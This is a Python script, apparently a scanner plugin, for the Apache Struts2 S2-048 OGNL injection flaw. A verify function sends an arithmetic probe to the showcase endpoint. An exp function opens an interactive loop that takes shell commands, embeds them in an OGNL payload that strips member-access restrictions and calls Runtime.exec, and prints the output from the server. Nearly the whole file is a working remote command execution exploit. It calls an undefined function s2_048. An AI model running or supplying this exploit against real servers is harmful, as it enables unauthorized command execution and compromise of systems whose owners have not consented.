import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-048 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    try:
        vulurl = urllib.parse.urljoin(url, '/integration/saveGangster.action')
        payload = r'''name=%24%7B1234*58614%7D&age=%24%7B233*233%7D&__checkbox_bustedBefore=true'''
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = requests.post(vulurl, headers=headers, timeout=3, data=payload)
        if '72329676' in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = vulurl
            relsult['position'] = 'data'
            relsult['payload'] = payload
            relsult['exp'] = True
        return relsult
    except:
        return relsult

def exp(url):
    if s2_048(url)['vulnerable']:
        while True:
            cmd_shell = input('[+] 执行命令:')
            payload = r"name=%25{(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context['com.opensymphony.xwork2.ActionContext.container']).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('"+ cmd_shell + "').getInputStream())).(%23q)}&age=%24%7B233*233%7D&__checkbox_bustedBefore=true"
            headers= {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            vulurl = urllib.parse.urljoin(url, '/integration/saveGangster.action')
            req = requests.post(vulurl, headers=headers, timeout=3, verify=False, data=payload)
            regex = r'<ul class="alert alert-info">[^<]*<li>[^<]*<span>Gangster(.*)'
            relsult = re.findall(regex, req.text)[0]
            print(relsult)

